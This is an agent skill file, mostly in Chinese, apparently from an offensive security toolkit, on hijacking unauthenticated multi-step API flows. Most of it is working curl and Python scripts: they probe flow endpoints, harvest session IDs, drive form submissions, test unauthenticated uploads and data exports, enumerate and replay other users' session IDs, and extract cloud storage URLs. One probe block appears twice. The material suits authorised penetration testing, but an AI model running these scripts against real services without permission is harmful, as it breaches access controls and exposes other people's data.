---
name: unauth-api-flow-hijack
description: 在无凭据的情况下利用未认证的多步 API 流程。
version: 1.1.0
revision_date: 2026-07-25
license: MIT
platforms: [linux]
compatibility: Requires curl, python3
metadata:
  tags: [recon, API, unauthenticated, flow, interview, form, upload, export]
  category: recon
  related_skills:
    - api-noauth-hunt
    - hardcoded-credential-hunt
    - hunt-write-gap
    - hunt-idor
---

# 未认证 API 流程劫持

利用那些实现了完整业务流程（面试、申请、结算、入驻）却在任何步骤都不要求认证的 API 端点。与简单的数据暴露不同，这些流程允许攻击者参与——并操纵——应用的核心业务逻辑：提交表单、上传文件、完成交易以及导出数据。整个状态机在无凭据的情况下都可访问。

## When to Use

- API 提供多步工作流（start → step1 → step2 → ... → complete）。
- 任何步骤都不需要认证令牌、会话 cookie 或 API 密钥。
- API 返回可在各步骤间复用的会话标识符（UUID、令牌）。
- 工作流包含文件上传、数据提交或导出功能。
- 错误消息暴露了预期的请求格式（可验证端点是否存活）。

## Prerequisites

- 具备 curl 和 python3 的 `terminal`。
- 至少发现一个无需认证即可接受 POST 的 API 端点。
- 该端点返回一个标识符（会话 ID、面试 ID、令牌），可传递给后续步骤。

## How to Run

```bash
# Probe common flow-starting endpoints
for ep in /start /api/start /api/v1/start /begin /init /api/init \
          /start-interview /api/interview/start /api/session/start; do
  code=$(curl --max-time 30 --connect-timeout 10 -sk -o /tmp/resp.json -w "%{http_code}" \
    -X POST "https://target.com$ep" \
    -H "Content-Type: application/json" -d '{}')
  if [ "$code" = "200" ] || [ "$code" = "201" ]; then
    echo "=== $ep ($code) ==="
    cat /tmp/resp.json | python3 -m json.tool 2>/dev/null | head -20
    # Extract any returned ID
    cat /tmp/resp.json | python3 -c "
import sys,json,re
try:
    d=json.load(sys.stdin)
    for k in d:
        if any(x in k.lower() for x in ['id','token','session','key']):
            print(f'{k}: {d[k]}')
except: pass
"
  fi
done
```

## 快速检测

```bash
# Probe common flow-starting endpoints
for ep in /start /api/start /api/v1/start /begin /init /api/init \
          /start-interview /api/interview/start /api/session/start; do
  code=$(curl --max-time 30 --connect-timeout 10 -sk -o /tmp/resp.json -w "%{http_code}" \
    -X POST "https://target.com$ep" \
    -H "Content-Type: application/json" -d '{}')
  if [ "$code" = "200" ] || [ "$code" = "201" ]; then
    echo "=== $ep ($code) ==="
    cat /tmp/resp.json | python3 -m json.tool 2>/dev/null | head -20
    # Extract any returned ID
    cat /tmp/resp.json | python3 -c "
import sys,json,re
try:
    d=json.load(sys.stdin)
    for k in d:
        if any(x in k.lower() for x in ['id','token','session','key']):
            print(f'{k}: {d[k]}')
except: pass
"
  fi
done
```

## Procedure

### 阶段 1 — 梳理流程

通过跟随 API 的自然推进过程来识别所有步骤：

```python
import requests, json

BASE = "https://target.com"
session = requests.Session()

# Step 1: Start the flow
r = session.post(f"{BASE}/api/flow/start", json={})
data = r.json()
flow_id = data.get("id") or data.get("sessionId") or data.get("token")
print(f"Started: {flow_id}")

# Step 2-N: Follow the flow by submitting whatever the API asks for
for step in range(1, 20):
    # Try generic submissions — the API's error messages will guide you
    r = session.post(f"{BASE}/api/flow/submit", json={
        "id": flow_id,
        "answer": "test response",
        "data": {"key": "value"}
    })

    resp = r.json()
    print(f"Step {step}: {resp.get('currentStep', '?')} — {resp.get('message', '')[:80]}")

    # Check for completion or blocked paths
    if resp.get("complete") or resp.get("error"):
        break

    # Extract any requirements from the message
    if "required" in str(resp).lower() or "invalid" in str(resp).lower():
        print(f"  Validation: {json.dumps(resp)[:200]}")
```

### 阶段 2 — 利用文件上传

若流程包含文件上传，测试是否存在不受限制的上传：

```bash
# Test file upload without auth
curl --max-time 30 --connect-timeout 10 -sk -X POST "https://target.com/api/flow/upload" \
  -F "file=@test.pdf;type=application/pdf" \
  -F "id=$FLOW_ID" | python3 -m json.tool

# The response often returns a public URL for the uploaded file
# Check if uploads are stored in a public bucket
```

### 阶段 3 — 利用数据导出

许多流程在完成时提供导出/下载：

```bash
# Test export without auth
curl --max-time 30 --connect-timeout 10 -sk "https://target.com/api/flow/export" -o export.xlsx
file export.xlsx  # Check if it's a real file with data

# Try export with different format parameters
for fmt in xlsx csv json pdf xml; do
  curl --max-time 30 --connect-timeout 10 -sk "https://target.com/api/flow/export?format=$fmt" -o "export.$fmt"
  [ -s "export.$fmt" ] && echo "export.$fmt: $(wc -c < export.$fmt) bytes"
done
```

### 阶段 4 — 枚举与重放

若会话 ID 可预测或已暴露，则枚举其他会话：

```bash
# Check if IDs are sequential or enumerable
for id in $(seq 1 100); do
  code=$(curl --max-time 30 --connect-timeout 10 -sk -o /dev/null -w "%{http_code}" \
    "https://target.com/api/flow/status/$id")
  [ "$code" = "200" ] && echo "Active: $id"
done

# Test if old session IDs can be replayed
curl --max-time 30 --connect-timeout 10 -sk -X POST "https://target.com/api/flow/submit" \
  -H "Content-Type: application/json" \
  -d '{"id": "OLD_SESSION_ID", "answer": "replay test"}'
```

### 阶段 5 — 与存储访问结合

若上传内容进入云存储桶，则与云攻击技能结合：

```bash
# Extract storage URLs from upload responses
curl --max-time 30 --connect-timeout 10 -sk -X POST "https://target.com/api/flow/upload" \
  -F "file=@test.pdf" \
  -F "id=$FLOW_ID" | python3 -c "
import sys, json, re
data = sys.stdin.read()
for url in re.findall(r'https?://[^\s\"<>]+\.(?:supabase\.co|amazonaws\.com|storage\.googleapis\.com)[^\s\"<>]*', data):
    print(f'STORAGE_URL: {url}')
"
```

## Pitfalls

- **限流会导致流程中断。** 多步 API 通常有按 IP 的限流。在各步骤之间放慢速度（延迟 0.5-1 秒）。
- **状态会过期。** 部分流程会在超时后使会话 ID 失效。若步骤开始失败，请重新启动流程。
- **存在校验关卡。** API 可能要求有效的数据格式（邮箱、电话、文件类型）。请仔细阅读错误消息——它们会准确说明期望的格式。
- **并非每一步都是 POST。** 部分流程用 GET 做状态检查、用 PUT 做更新、用 DELETE 做取消。请测试所有方法。
- **导出结果可能为空。** 刚启动的流程会产生空导出。请先完整走完整个流程再测试导出。

## Verification

1. 在完全没有任何认证的情况下从头到尾完成整个流程。
2. 验证每一步都产生了可在后续步骤中观察到的状态变化（流程在推进）。
3. 确认文件上传已被存储且可获取（检查返回的 URL）。
4. 验证导出产生真实数据（检查文件大小与内容）。
5. 若会话 ID 可枚举，确认可跨会话访问（访问另一个会话的数据）。

---

## 相关技能

- **`api-noauth-hunt`** — 检测缺少认证的 API 端点。
- **`hardcoded-credential-hunt`** — 寻找可解锁流程中特权步骤的密码。
- **`hunt-write-gap`** — 无需读认证即可接受写入的 POST/PUT 端点。
- **`hunt-idor`** — 利用流程会话 ID 中的不安全直接对象引用。
- **`hunt-firebase`** / **`hunt-supabase`** — 若上传内容进入 Firebase/Supabase 存储。
